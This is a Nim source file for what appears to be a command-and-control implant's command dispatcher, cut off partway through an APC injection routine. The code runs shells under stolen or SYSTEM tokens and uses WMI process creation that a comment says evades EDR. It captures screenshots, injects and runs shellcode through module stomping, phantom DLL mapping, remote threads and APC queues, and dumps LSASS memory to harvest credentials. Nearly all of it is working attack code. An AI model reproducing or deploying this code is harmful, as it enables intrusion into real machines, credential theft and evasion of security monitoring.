## Command dispatcher for Nim agent — Windows + Linux.
import std/[os, osproc, strutils, strformat, json, random, base64, sequtils, times, tables, locks]
import config, transport, evasion, portfwd

var gBofStore = initTable[string, seq[byte]]()

when defined(windows):
  import winim/lean, winim/inc/tlhelp32
  import kerberos, pe_exec, browsercreds, dotnet
  import rsocks, http_pivot, tcp_pivot, pipe_server
  import bof
  import api_hash

when not defined(windows):
  import std/net
  import posix as posixLib

# ─────────────────────────────────────────────────────────────────────────────
# Cross-platform globals
# ─────────────────────────────────────────────────────────────────────────────
var sleepSecDyn* = SleepSec
var jitterDyn*   = JitterPct

var gSwStop      {.volatile.}: bool = true
var gSwInterval: int               = 10
var gSwTaskId:   int64             = 0
var gSwLastTick: float             = 0.0   # epochTime() seconds
var gSwFrame:    int               = 0

var gKeylogStop  {.volatile.}: bool = true
var gKeylogBuf:  string             = ""

var gSocksStop   {.volatile.}: bool = true

# ─────────────────────────────────────────────────────────────────────────────
# Windows-only globals
# ─────────────────────────────────────────────────────────────────────────────
when defined(windows):
  const THREAD_SET_CONTEXT_FLAG: DWORD = 0x0010

  # Primary SYSTEM token stored by getsystem; used by runShell via
  # CreateProcessWithTokenW so shell commands run as SYSTEM regardless
  # of which thread dispatches them (thread impersonation is per-thread).
  var gSystemToken: HANDLE = 0
  # Primary token from steal-token/make-token; used by runShell when gSystemToken is 0.
  var gStolenToken: HANDLE = 0
  var gTokenLock: Lock
  initLock(gTokenLock)

  proc CreateProcessWithTokenW(
    hToken: HANDLE, dwLogonFlags: DWORD,
    lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR,
    dwCreationFlags: DWORD, lpEnvironment: pointer,
    lpCurrentDirectory: LPCWSTR, lpStartupInfo: ptr STARTUPINFOW,
    lpProcessInformation: ptr PROCESS_INFORMATION
  ): WINBOOL {.importc, stdcall, dynlib: "advapi32".}

  proc CreateProcessAsUserW(
    hToken: HANDLE,
    lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR,
    lpProcessAttributes: pointer, lpThreadAttributes: pointer,
    bInheritHandles: WINBOOL, dwCreationFlags: DWORD,
    lpEnvironment: pointer, lpCurrentDirectory: LPCWSTR,
    lpStartupInfo: ptr STARTUPINFOW,
    lpProcessInformation: ptr PROCESS_INFORMATION
  ): WINBOOL {.importc, stdcall, dynlib: "advapi32".}

  proc CreateProcessWithLogonW(
    lpUsername: LPCWSTR, lpDomain: LPCWSTR, lpPassword: LPCWSTR,
    dwLogonFlags: DWORD, lpApplicationName: LPCWSTR,
    lpCommandLine: LPWSTR, dwCreationFlags: DWORD, lpEnvironment: pointer,
    lpCurrentDirectory: LPCWSTR, lpStartupInfo: ptr STARTUPINFOW,
    lpProcessInformation: ptr PROCESS_INFORMATION
  ): WINBOOL {.importc, stdcall, dynlib: "advapi32".}

  proc OpenThreadToken(
    ThreadHandle: HANDLE, DesiredAccess: DWORD,
    OpenAsSelf: WINBOOL, TokenHandle: ptr HANDLE
  ): WINBOOL {.importc, stdcall, dynlib: "advapi32".}

  proc SetTokenInformation(
    TokenHandle: HANDLE, TokenInformationClass: int32,
    TokenInformation: pointer, TokenInformationLength: DWORD
  ): WINBOOL {.importc, stdcall, dynlib: "advapi32".}

  # Forward declaration: the shell path is defined before the privilege
  # helper below, but needs to enable the token-launch privileges first.
  proc enablePriv(hToken: HANDLE; privName: string): bool

  var gIshellProc:    HANDLE = 0
  var gIshellStdinW:  HANDLE = 0
  var gIshellStdoutR: HANDLE = 0
  var gKeylogHook:    HHOOK  = 0
  var gKeylogThread:  HANDLE = 0
  var gClipStop      {.volatile.}: bool = true
  var gClipBuf:  string = ""
  var gClipInterval: int = 5
  var gClipThread: HANDLE = 0
  var gSocksSocket: SOCKET = INVALID_SOCKET
  var gSocksThread: HANDLE = 0

  type TokenEntry = object
    id:    int
    pid:   DWORD
    user:  string
    token: HANDLE
  var gTokenStore: seq[TokenEntry]

  type RelayParam = object
    src: SOCKET
    dst: SOCKET

# ─────────────────────────────────────────────────────────────────────────────
# Linux-only globals
# ─────────────────────────────────────────────────────────────────────────────
when not defined(windows):
  var gSocksListenFd: cint = -1
  var gSocksServerThread: Thread[int]

# ─────────────────────────────────────────────────────────────────────────────
# Cross-platform helpers
# ─────────────────────────────────────────────────────────────────────────────
proc currentSleepMs*(): int =
  let base  = float(sleepSecDyn) * 1000.0
  let jit   = base * float(jitterDyn) / 100.0
  let delta = (rand(1.0) * 2.0 - 1.0) * jit
  return max(1000, int(base + delta))

proc extractFilename(path: string): string =
  let s = path.replace('\\', '/')
  let i = s.rfind('/')
  if i < 0: return s
  return s[i+1..^1]

proc runShell*(cmd: string): string =
  try:
    when defined(windows):
      let activeTok = block:
        acquire(gTokenLock)
        let t = if gSystemToken != 0: gSystemToken
                elif gStolenToken != 0: gStolenToken
                else: HANDLE(0)
        release(gTokenLock)
        t
      if activeTok != 0:
        # ── Privilege setup ───────────────────────────────────────────────────
        var hSelf: HANDLE
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
            addr hSelf) != 0:
          discard enablePriv(hSelf, "SeImpersonatePrivilege")
          discard enablePriv(hSelf, "SeIncreaseQuotaPrivilege")
          discard enablePriv(hSelf, "SeAssignPrimaryTokenPrivilege")
          discard CloseHandle(hSelf)
        discard enablePriv(activeTok, "SeImpersonatePrivilege")
        discard enablePriv(activeTok, "SeIncreaseQuotaPrivilege")
        discard enablePriv(activeTok, "SeAssignPrimaryTokenPrivilege")

        # Use the same stable token-launch path as the Go agent.  Redirecting
        # in the child avoids anonymous-pipe inheritance problems across
        # sessions and lets us validate the process exit/capture result.
        let uid = toHex(int64(GetCurrentProcessId()) xor int64(GetTickCount()) xor
                        (int64(GetCurrentThreadId()) shl 32), 16)
        let outPath = "C:\\Windows\\Temp\\sbo" & uid & ".tmp"
        let shellArgs = "/d /c " & cmd & " > \"" & outPath & "\" 2>&1"
        var si2: STARTUPINFOW; zeroMem(addr si2, sizeof(si2))
        si2.cb = DWORD(sizeof(si2))
        si2.dwFlags = DWORD(STARTF_USESHOWWINDOW); si2.wShowWindow = WORD(SW_HIDE)
        var pi2: PROCESS_INFORMATION; zeroMem(addr pi2, sizeof(pi2))
        let appW2 = newWideCString("C:\\Windows\\System32\\cmd.exe")
        let cwdW2 = newWideCString("C:\\Windows\\System32")
        var argsW2 = newWideCString(shellArgs)
        var argsAsUserW = newWideCString(shellArgs)
        var procOk2 = CreateProcessWithTokenW(activeTok, 0, appW2, argsW2,
          CREATE_NO_WINDOW, nil, cwdW2, addr si2, addr pi2)
        var withTokenErr: DWORD = if procOk2 != 0: 0 else: GetLastError()
        var asUserErr: DWORD = 0
        var impersonateErr: DWORD = 0
        if procOk2 == 0:
          procOk2 = CreateProcessAsUserW(activeTok, appW2, argsAsUserW, nil, nil,
            WINBOOL(0), CREATE_NO_WINDOW, nil, cwdW2, addr si2, addr pi2)
          if procOk2 == 0: asUserErr = GetLastError()
        if procOk2 == 0:
          # Last fallback for tokens that cannot be used directly by either
          # primary-token API: impersonate on this thread and retry.
          if ImpersonateLoggedOnUser(activeTok) != 0:
            var retryW = newWideCString(shellArgs)
            procOk2 = CreateProcessWithTokenW(activeTok, 0, appW2, retryW,
              CREATE_NO_WINDOW, nil, cwdW2, addr si2, addr pi2)
            if procOk2 == 0: withTokenErr = GetLastError()
            discard RevertToSelf()
          else:
            impersonateErr = GetLastError()
        if procOk2 == 0:
          return "[error: token shell launch; WithToken=" & $withTokenErr &
            "; AsUser=" & $asUserErr & "; Impersonate=" & $impersonateErr & "]"
        let waitRes = WaitForSingleObject(pi2.hProcess, DWORD(60000))
        var exitCode: DWORD = DWORD(259)
        discard GetExitCodeProcess(pi2.hProcess, addr exitCode)
        if waitRes == DWORD(WAIT_TIMEOUT):
          discard TerminateProcess(pi2.hProcess, 1)
          exitCode = 1
        discard CloseHandle(pi2.hProcess); discard CloseHandle(pi2.hThread)
        var output2 = ""
        try: output2 = readFile(outPath) except: discard
        discard DeleteFileA(outPath)
        if output2.len == 0 and exitCode != 0:
          return "[error: token shell capture empty; exit=" & $exitCode &
            "; WithToken=" & $withTokenErr & "; AsUser=" & $asUserErr &
            "; Impersonate=" & $impersonateErr & "]"
        return output2
      # Do not wrap the complete command in an extra pair of quotes: cmd.exe
      # then treats embedded quotes/redirection as literal text. /d also
      # disables AutoRun so shell capture is deterministic like the other
      # agents.
      let (output, _) = execCmdEx("cmd.exe /d /c " & cmd)
      return output
    else:
      let (output, _) = execCmdEx("/bin/sh -c " & quoteShell(cmd))
      return output
  except: return "[error: " & getCurrentExceptionMsg() & "]"

proc runShellOpsec*(cmd: string): string =
  ## Executes cmd via WMI Win32_Process.Create so the spawned process is a
  ## child of WmiPrvSE.exe, not of this agent — evades parent-child EDR rules.
  when defined(windows):
    let outPath = "C:\\ProgramData\\sbo" & $GetCurrentProcessId() &
                  $GetTickCount() & ".tmp"
    let innerCmd = "cmd.exe /d /c " & cmd & " > " & outPath & " 2>&1"
    # Use wmic to create the process via WMI; final cmd.exe runs under WmiPrvSE.exe
    let wmicCmd = "wmic process call create \"" & innerCmd & "\""
    let wmicOut = runShell(wmicCmd)

    # Parse PID from wmic output: "ProcessId = NNNN;"
    var childPid: DWORD = 0
    let marker = "ProcessId = "
    let mIdx = wmicOut.find(marker)
    if mIdx >= 0:
      let rest = wmicOut[mIdx + marker.len .. ^1]
      var pidStr = ""
      for ch in rest:
        if ch in {'0'..'9'}: pidStr &= ch
        else: break
      try: childPid = DWORD(parseInt(pidStr))
      except: discard

    if childPid > 0:
      let hc = OpenProcess(SYNCHRONIZE, 0, childPid)
      if hc != 0:
        discard WaitForSingleObject(hc, 30000)
        discard CloseHandle(hc)
      else: sleep(8000)
    else: sleep(8000)

    try:
      result = readFile(outPath)
      discard tryRemoveFile(outPath)
    except: result = "[no output]"
    if result.len == 0: result = runShell(cmd)
  else:
    return runShell(cmd)

# ─────────────────────────────────────────────────────────────────────────────
# Windows-only procs
# ─────────────────────────────────────────────────────────────────────────────
when defined(windows):
  proc getEnvCmd(k, default: string): string =
    var buf = newWideCString(newString(512))
    let n = GetEnvironmentVariableW(newWideCString(k), buf, 512)
    if n == 0: return default
    return $buf

  # ── Screenshot (native GDI) ──────────────────────────────────────────────────
  proc doScreenshotWin(): (seq[byte], bool) =
    let hDC = GetDC(0)
    if hDC == 0: return (@[], false)
    defer: discard ReleaseDC(0, hDC)
    let w = GetSystemMetrics(SM_CXSCREEN)
    let h = GetSystemMetrics(SM_CYSCREEN)
    if w <= 0 or h <= 0: return (@[], true)
    let hMem = CreateCompatibleDC(hDC)
    if hMem == 0: return (@[], false)
    defer: discard DeleteDC(hMem)
    let hBmp = CreateCompatibleBitmap(hDC, w, h)
    if hBmp == 0: return (@[], false)
    defer: discard DeleteObject(hBmp)
    let hOld = SelectObject(hMem, hBmp)
    defer: discard SelectObject(hMem, hOld)
    discard BitBlt(hMem, 0, 0, w, h, hDC, 0, 0, SRCCOPY)
    var bi: BITMAPINFOHEADER
    bi.biSize = DWORD(sizeof(bi))
    bi.biWidth = w; bi.biHeight = -h
    bi.biPlanes = 1; bi.biBitCount = 32
    bi.biCompression = BI_RGB
    let dataSz = w * h * 4
    var pixels = newSeq[uint8](dataSz)
    if GetDIBits(hMem, hBmp, 0, UINT(h), addr pixels[0],
                 cast[ptr BITMAPINFO](addr bi), DIB_RGB_COLORS) == 0:
      return (@[], false)
    var allBlack = true
    for px in pixels:
      if px != 0: allBlack = false; break
    if allBlack: return (@[], true)
    let rowBytes = ((w * 32 + 31) div 32) * 4
    let fileSize = 54 + rowBytes * h
    var bmpFile = newSeq[byte](fileSize)
    template w32(off: int, v: uint32) =
      bmpFile[off]   = uint8(v and 0xFF)
      bmpFile[off+1] = uint8((v shr 8) and 0xFF)
      bmpFile[off+2] = uint8((v shr 16) and 0xFF)
      bmpFile[off+3] = uint8((v shr 24) and 0xFF)
    template w16(off: int, v: uint16) =
      bmpFile[off]   = uint8(v and 0xFF)
      bmpFile[off+1] = uint8((v shr 8) and 0xFF)
    bmpFile[0] = 0x42; bmpFile[1] = 0x4D
    w32(2,  uint32(fileSize))
    w32(10, 54u32)
    w32(14, 40u32)
    w32(18, uint32(w)); w32(22, uint32(h))
    w16(26, 1u16); w16(28, 32u16)
    w32(30, BI_RGB)
    w32(34, uint32(rowBytes * h))
    for row in 0 ..< h:
      let srcRow = (h - 1 - row) * w * 4
      let dstRow = 54 + row * rowBytes
      for col in 0 ..< w:
        let s = srcRow + col * 4
        let d = dstRow + col * 4
        bmpFile[d]   = pixels[s+2]
        bmpFile[d+1] = pixels[s+1]
        bmpFile[d+2] = pixels[s]
        bmpFile[d+3] = pixels[s+3]
    return (bmpFile, false)

  # ── SHELLCODE_STOMP ──────────────────────────────────────────────────────────
  proc doShellcodeStompInner(sc: seq[byte]; dllHint: string): string =
    let autoTargets = ["xpsservices.dll","clbcatq.dll","msasn1.dll","wbemprox.dll","wbemcomn.dll"]
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0)
    if snap == INVALID_HANDLE_VALUE: return "[-] shellcode_stomp: snapshot failed"
    defer: discard CloseHandle(snap)
    var me: MODULEENTRY32; me.dwSize = DWORD(sizeof(me))
    var targetBase: LPVOID = nil; var targetName = ""
    if Module32First(snap, addr me) != 0:
      while true:
        let modName = ($cast[cstring](addr me.szModule[0])).toLowerAscii()
        let pick = if dllHint.len > 0: modName == dllHint.toLowerAscii()
                   else: autoTargets.contains(modName)
        if pick:
          targetBase = me.modBaseAddr
          targetName = modName
          break
        if Module32Next(snap, addr me) == 0: break
    if targetBase == nil: return "[-] shellcode_stomp: target DLL not loaded"

    # Parse PE → .text section
    let base = cast[uint](targetBase)
    let e_lfanew = cast[ptr uint32](base + 0x3C)[]
    let nt = base + uint(e_lfanew)
    let numSecs  = cast[ptr uint16](nt + 6)[]
    let optSz    = cast[ptr uint16](nt + 20)[]
    var sec = nt + 24 + uint(optSz)
    var textRva, textSz: uint32
    for _ in 0..<int(numSecs):
      let nameBytes = cast[cstring](sec)
      if $nameBytes == ".text":
        textSz  = cast[ptr uint32](sec + 16)[]
        textRva = cast[ptr uint32](sec + 12)[]
        break
      sec += 40
    if textSz == 0: return "[-] shellcode_stomp: no .text in " & targetName

    let writeAddr = cast[LPVOID](base + uint(textRva))
    let writeLen  = SIZE_T(min(sc.len, int(textSz)))
    var old: DWORD = 0
    discard VirtualProtect(writeAddr, writeLen, PAGE_READWRITE, addr old)
    copyMem(writeAddr, unsafeAddr sc[0], int(writeLen))
    discard VirtualProtect(writeAddr, writeLen, PAGE_EXECUTE_READ, addr old)
    let ht = callCreateThread(nil, 0, writeAddr, nil, 0, nil)
    if ht == 0: return "[-] shellcode_stomp: CreateThread failed"
    discard callCloseHandle(ht)
    "[+] shellcode_stomp: " & targetName & "+0x" & toHex(textRva, 8) &
      " sc=" & $sc.len & " B \xe2\x86\x92 executing"

  # ── In-process shellcode execution (STAGE2) ──────────────────────────────────
  proc doSelfInject(sc: seq[byte]): string =
    let mem = VirtualAlloc(nil, SIZE_T(sc.len), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if mem == nil: return "[-] VirtualAlloc failed (err " & $GetLastError() & ")"
    copyMem(mem, unsafeAddr sc[0], sc.len)
    var old: DWORD = 0
    discard VirtualProtect(mem, SIZE_T(sc.len), PAGE_EXECUTE_READ, addr old)
    let ht = callCreateThread(nil, 0, mem, nil, 0, nil)
    if ht == 0: return "[-] CreateThread failed (err " & $GetLastError() & ")"
    discard callCloseHandle(ht)
    "[+] self-inject: " & $sc.len & " bytes \xe2\x86\x92 executing"

  # ── LSASS dump via NtReadVirtualMemory (no MiniDumpWriteDump) ───────────────
  proc lsassDumpNT(lsasPid: DWORD): seq[byte] =
    var pid = lsasPid
    if pid == 0:
      let snap0 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
      if snap0 != INVALID_HANDLE_VALUE:
        var pe: PROCESSENTRY32W; pe.dwSize = DWORD(sizeof(pe))
        if Process32FirstW(snap0, addr pe) != 0:
          while true:
            if ($cast[WideCString](addr pe.szExeFile[0])).toLowerAscii() == "lsass.exe":
              pid = pe.th32ProcessID; break
            if Process32NextW(snap0, addr pe) == 0: break
        discard CloseHandle(snap0)
    if pid == 0: return @[]
    let hProc = OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, FALSE, pid)
    if hProc == 0: return @[]
    defer: discard CloseHandle(hProc)
    # NtReadVirtualMemory
    type NtReadVM_t = proc(h: HANDLE; base: PVOID; buf: PVOID; sz: SIZE_T; nr: ptr SIZE_T): LONG {.stdcall.}
    let ntdll = GetModuleHandleA("ntdll.dll")
    let ntReadVM = cast[NtReadVM_t](GetProcAddress(ntdll, "NtReadVirtualMemory"))
    if ntReadVM == nil: return @[]
    # detect real OS version via RtlGetVersion (bypasses compatibility shim)
    type RtlGetVersion_t = proc(lpVersionInformation: LPOSVERSIONINFOW): LONG {.stdcall.}
    var osvi: OSVERSIONINFOW; osvi.dwOSVersionInfoSize = DWORD(sizeof(osvi))
    let pfnRtlGetVersion = cast[RtlGetVersion_t](GetProcAddress(ntdll, "RtlGetVersion"))
    if pfnRtlGetVersion != nil: discard pfnRtlGetVersion(addr osvi)
    let osMajor = uint32(if osvi.dwMajorVersion != 0: osvi.dwMajorVersion else: 10)
    let osMinor = uint32(osvi.dwMinorVersion)
    let osBuild = uint32(if osvi.dwBuildNumber  != 0: osvi.dwBuildNumber  else: 19041)
    # Enumerate modules
    type ModInfo = object
      base: uint64
      sz: uint32
      name: string
    var mods: seq[ModInfo]
    let snap1 = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid)
    if snap1 != INVALID_HANDLE_VALUE:
      var me: MODULEENTRY32; me.dwSize = DWORD(sizeof(me))
      if Module32First(snap1, addr me) != 0:
        while true:
          mods.add(ModInfo(base: cast[uint64](me.modBaseAddr), sz: me.modBaseSize.uint32,
                           name: $cast[cstring](addr me.szModule[0])))
          if Module32Next(snap1, addr me) == 0: break
      discard CloseHandle(snap1)
    # Enumerate committed memory regions
    type MemReg = object
      address: uint64
      sz: uint64
      rawBytes: seq[byte]
    var regs: seq[MemReg]
    var cur: uint64 = 0
    while true:
      var mbi: MEMORY_BASIC_INFORMATION
      let r = VirtualQueryEx(hProc, cast[LPCVOID](cur), addr mbi, SIZE_T(sizeof(mbi)))
      if r == 0: break
      if mbi.State == MEM_COMMIT:
        var rbuf = newSeq[byte](mbi.RegionSize)
        var nRead: SIZE_T = 0
        discard ntReadVM(hProc, mbi.BaseAddress, addr rbuf[0], SIZE_T(mbi.RegionSize), addr nRead)
        if nRead > 0:
          regs.add(MemReg(address: cast[uint64](mbi.BaseAddress), sz: nRead.uint64,
                          rawBytes: rbuf[0..<nRead]))
      let next = cast[uint64](mbi.BaseAddress) + mbi.RegionSize.uint64
      if next <= cur: break
      cur = next
    # ── Build MDMP ──────────────────────────────────────────────────────────
    template pu16(off: int; v: uint16) =
      buf[off]   = uint8(v and 0xFF)
      buf[off+1] = uint8(v shr 8)
    template pu32(off: int; v: uint32) =
      buf[off]   = uint8(v and 0xFF)
      buf[off+1] = uint8((v shr  8) and 0xFF)
      buf[off+2] = uint8((v shr 16) and 0xFF)
      buf[off+3] = uint8(v shr 24)
    template pu64(off: int; v: uint64) =
      pu32(off,   uint32(v and 0xFFFFFFFF'u64))
      pu32(off+4, uint32(v shr 32))
    const modEntSz  = 108
    const sysInfoSz = 62  # 56 struct + 6 bytes empty MINIDUMP_STRING for CSDVersionRva
    const numStr    = 3
    let dirOff      = 32
    let sysInfoOff  = dirOff + numStr * 12  # 68
    let modListOff  = sysInfoOff + sysInfoSz # 130
    # module name blobs (MINIDUMP_STRING: ULONG32 len + UTF-16 + null)
    type NameBlob = object
      rva: int
      rawBytes: seq[byte]
    var names: seq[NameBlob]
    var nameOff = modListOff + 4 + mods.len * modEntSz
    for m in mods:
      var blob = newSeq[byte](4 + (m.name.len + 1) * 2)
      let lenBytes = uint32(m.name.len * 2)
      blob[0] = uint8(lenBytes and 0xFF); blob[1] = uint8(lenBytes shr 8)
      for j, c in m.name:
        blob[4 + j*2] = uint8(ord(c)); blob[4 + j*2 + 1] = 0'u8
      names.add(NameBlob(rva: nameOff, rawBytes: blob))
      nameOff += blob.len
    let mem64Off    = nameOff
    let mem64HdrLen = 8 + 8 + regs.len * 16
    let dataOff     = mem64Off + mem64HdrLen
    var totalData   = 0
    for r in regs: totalData += r.rawBytes.len
    var buf = newSeq[byte](dataOff + totalData)
    # MINIDUMP_HEADER
    pu32(0,  0x504d444d'u32)
    pu32(4,  0x0000a793'u32)
    pu32(8,  numStr.uint32)
    pu32(12, dirOff.uint32)
    pu32(16, 0'u32)
    pu32(20, uint32(epochTime().uint64))
    pu64(24, 2'u64)
    # Directories
    pu32(dirOff,    7'u32); pu32(dirOff+4, sysInfoSz.uint32);  pu32(dirOff+8,  sysInfoOff.uint32)
    pu32(dirOff+12, 4'u32); pu32(dirOff+16, uint32(mem64Off - modListOff)); pu32(dirOff+20, modListOff.uint32)
    pu32(dirOff+24, 9'u32); pu32(dirOff+28, mem64HdrLen.uint32); pu32(dirOff+32, mem64Off.uint32)
    # SystemInfo
    pu16(sysInfoOff,    9'u16)   # PROCESSOR_ARCHITECTURE_AMD64
    pu16(sysInfoOff+2,  6'u16)   # ProcessorLevel
    buf[sysInfoOff+6] = 1'u8     # NumberOfProcessors
    buf[sysInfoOff+7] = 1'u8     # ProductType
    pu32(sysInfoOff+8,  osMajor) # MajorVersion
    pu32(sysInfoOff+12, osMinor) # MinorVersion
    pu32(sysInfoOff+16, osBuild) # BuildNumber
    pu32(sysInfoOff+20, 2'u32)   # PlatformId
    # CSDVersionRva → 6-byte empty MINIDUMP_STRING after the 56-byte struct
    # (Length=0, null wchar = 00 00 00 00 00 00, already zero from newSeq)
    pu32(sysInfoOff+24, uint32(sysInfoOff + 56))
    # ModuleList
    pu32(modListOff, mods.len.uint32)
    for i, m in mods:
      let e = modListOff + 4 + i * modEntSz
      pu64(e,    m.base)
      pu32(e+8,  m.sz)
      pu32(e+20, names[i].rva.uint32)
    for nb in names:
      for j, b in nb.rawBytes: buf[nb.rva + j] = b
    # Memory64List
    pu64(mem64Off,   regs.len.uint64)
    pu64(mem64Off+8, dataOff.uint64)
    for i, r in regs:
      let e = mem64Off + 16 + i * 16
      pu64(e,   r.address)
      pu64(e+8, r.sz)
    # Raw data
    var pos = dataOff
    for r in regs:
      for b in r.rawBytes: buf[pos] = b; inc pos
    return buf

  # ── Phantom DLL / module stomping (UDRL) ─────────────────────────────────────
  proc phantomLoad(sc: seq[byte]): string =
    if sc.len == 0: return "[-] phantomLoad: empty shellcode"
    let sysRoot = getEnvCmd("SystemRoot", "C:\\Windows")
    var hostPath = ""
    for name in [sysRoot & "\\System32\\xpsservices.dll",
                 sysRoot & "\\System32\\clbcatq.dll",
                 sysRoot & "\\System32\\msasn1.dll"]:
      if fileExists(name): hostPath = name; break
    if hostPath.len == 0: return "[-] phantomLoad: no host DLL found"

    let ntdll = GetModuleHandleA("ntdll.dll")
    if ntdll == 0: return "[-] phantomLoad: GetModuleHandleA(ntdll) failed"

    type
      NtCreateSection_t    = proc(H: ptr HANDLE; Acc: DWORD; Oa: pointer; MaxSz: pointer;
                                  Prot: ULONG; Attr: ULONG; Fh: HANDLE): NTSTATUS {.stdcall.}
      NtMapViewOfSection_t = proc(Sec: HANDLE; Proc: HANDLE; Base: ptr pointer;
                                  Bits: ULONG_PTR; Csz: SIZE_T; Off: pointer;
                                  Vsz: ptr SIZE_T; Inh: ULONG; At: ULONG; Prot: ULONG): NTSTATUS {.stdcall.}
      NtProtectVM_t        = proc(Proc: HANDLE; Base: ptr pointer; Sz: ptr SIZE_T;
                                  NewProt: ULONG; OldProt: ptr ULONG): NTSTATUS {.stdcall.}
      NtCreateThreadEx_t   = proc(H: ptr HANDLE; Acc: DWORD; Oa: pointer; Proc: HANDLE;
                                  Start: pointer; Param: pointer; Flags: ULONG;
                                  Zb: SIZE_T; SzC: SIZE_T; SzR: SIZE_T; Bb: pointer): NTSTATUS {.stdcall.}

    let pfnCS     = cast[NtCreateSection_t]   (GetProcAddress(ntdll, "NtCreateSection"))
    let pfnMap    = cast[NtMapViewOfSection_t](GetProcAddress(ntdll, "NtMapViewOfSection"))
    let pfnProt   = cast[NtProtectVM_t]       (GetProcAddress(ntdll, "NtProtectVirtualMemory"))
    let pfnThread = cast[NtCreateThreadEx_t]  (GetProcAddress(ntdll, "NtCreateThreadEx"))
    if pfnCS == nil or pfnMap == nil or pfnProt == nil:
      return "[-] phantomLoad: ntdll resolve failed"

    # NtOpenFile — NT namespace path \??\...
    let ntPath  = "\\??\\" & hostPath
    var pathW   = newWideCString(ntPath)
    var ustr    = UNICODE_STRING(
      Length:        USHORT(ntPath.len * 2),
      MaximumLength: USHORT(ntPath.len * 2 + 2),
      Buffer:        cast[PWSTR](addr pathW[0]))
    var oa: OBJECT_ATTRIBUTES
    InitializeObjectAttributes(addr oa, addr ustr, OBJ_CASE_INSENSITIVE, 0, nil)
    var isb: IO_STATUS_BLOCK
    var fileH: HANDLE = 0
    let stOpen = NtOpenFile(addr fileH,
                            GENERIC_READ or FILE_EXECUTE or SYNCHRONIZE,
                            addr oa, addr isb,
                            FILE_SHARE_READ or FILE_SHARE_DELETE,
                            0x00000020 or 0x00000040) # SYNC_IO | NON_DIR
    if stOpen != 0 or fileH == 0:
      return "[-] NtOpenFile: 0x" & toHex(uint32(stOpen), 8)
    defer: discard NtClose(fileH)

    # NtCreateSection SEC_IMAGE
    var secH: HANDLE = 0
    let st2 = pfnCS(addr secH, SECTION_ALL_ACCESS, nil, nil, PAGE_READONLY, SEC_IMAGE, fileH)
    if st2 != 0 or secH == 0:
      return "[-] NtCreateSection: 0x" & toHex(uint32(st2), 8)
    defer: discard NtClose(secH)

    # NtMapViewOfSection CoW
    var mappedBase: pointer = nil
    var viewSize: SIZE_T = 0
    var st3 = pfnMap(secH, GetCurrentProcess(), addr mappedBase, 0, 0, nil,
                     addr viewSize, 1, 0, PAGE_EXECUTE_WRITECOPY)
    if st3 != 0:
      mappedBase = nil; viewSize = 0
      st3 = pfnMap(secH, GetCurrentProcess(), addr mappedBase, 0, 0, nil,
                   addr viewSize, 1, 0, PAGE_EXECUTE_READ)
      if st3 != 0:
        return "[-] NtMapViewOfSection: 0x" & toHex(uint32(st3), 8)

    var writeSize = SIZE_T(sc.len)
    if writeSize > viewSize: writeSize = viewSize

    # RW → CoW triggers private pages
    var oldProt: ULONG = 0
    var bptr = mappedBase; var ws = writeSize
    discard pfnProt(GetCurrentProcess(), addr bptr, addr ws, PAGE_READWRITE, addr oldProt)
    copyMem(mappedBase, unsafeAddr sc[0], int(writeSize))

    # RX — never RWX
    bptr = mappedBase; ws = writeSize
    discard pfnProt(GetCurrentProcess(), addr bptr, addr ws, PAGE_EXECUTE_READ, addr oldProt)

    # Execute
    if pfnThread != nil:
      var hThr: HANDLE = 0
      discard pfnThread(addr hThr, 0x1FFFFF, nil, GetCurrentProcess(),
                        mappedBase, nil, 0, 0, 0, 0, nil)
      if hThr != 0: discard NtClose(hThr)
    else:
      let ht = callCreateThread(nil, 0, mappedBase, nil, 0, nil)
      if ht != 0: discard callCloseHandle(ht)

    "[+] phantomLoad: host=" & hostPath & " mapped=0x" &
      toHex(cast[uint64](mappedBase), 16) & " sc=" & $sc.len & " B \xe2\x86\x92 executing"

  # ── Remote thread injection ──────────────────────────────────────────────────
  proc doInjectRemote(pid: int; sc: seq[byte]): string =
    # Resolved via PEB walk — no IAT entries for OpenProcess/VirtualAllocEx/
    # WriteProcessMemory/VirtualProtectEx/CreateRemoteThread.
    let hProc = callOpenProcess(PROCESS_ALL_ACCESS, WINBOOL(0), DWORD(pid))
    if hProc == 0: return "OpenProcess failed (err " & $GetLastError() & ")"
    defer: discard callCloseHandle(hProc)
    let mem = callVirtualAllocEx(hProc, nil, SIZE_T(sc.len),
                                 MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if mem == nil: return "VirtualAllocEx failed (err " & $GetLastError() & ")"
    var written: SIZE_T
    discard callWriteProcessMemory(hProc, mem, cast[LPCVOID](unsafeAddr sc[0]),
                                   SIZE_T(sc.len), addr written)
    var old: DWORD
    discard callVirtualProtectEx(hProc, mem, SIZE_T(sc.len), PAGE_EXECUTE_READ, addr old)
    var tid: DWORD
    let ht = callCreateRemoteThread(hProc, nil, 0, mem, nil, 0, addr tid)
    if ht == 0: return "CreateRemoteThread failed (err " & $GetLastError() & ")"
    discard callCloseHandle(ht)
    return "[+] injected " & $sc.len & " bytes into PID " & $pid & " (TID=" & $tid & ")"

  # ── APC queue injection ──────────────────────────────────────────────────────
  proc doInjectAPC(pid: int; sc: seq[byte]): string =
    # Resolved via PEB walk — no IAT entries for OpenProcess/VirtualAllocEx/
    # WriteProcessMemory/OpenThread/QueueUserAPC.
    let hProc = callOpenProcess(PROCESS_ALL_ACCESS, WINBOOL(0), DWORD(pid))
    if hProc == 0: return "OpenProcess failed (err " & $GetLastError() & ")"
    defer: discard callCloseHandle(hProc)
    let mem = callVirtualAllocEx(hProc, nil, SIZE_T(sc.len),
                                 MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if mem == nil: return "VirtualAllocEx failed (err " & $GetLastError() & ")"
    var written: SIZE_T
    discard callWriteProcessMemory(hProc, mem, cast[LPCVOID](unsafeAddr sc[0]),
                                   SIZE_T(sc.len), addr written)
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
    if snap == INVALID_HANDLE_VALUE: return "snapshot failed"
    defer: discard CloseHandle(snap)
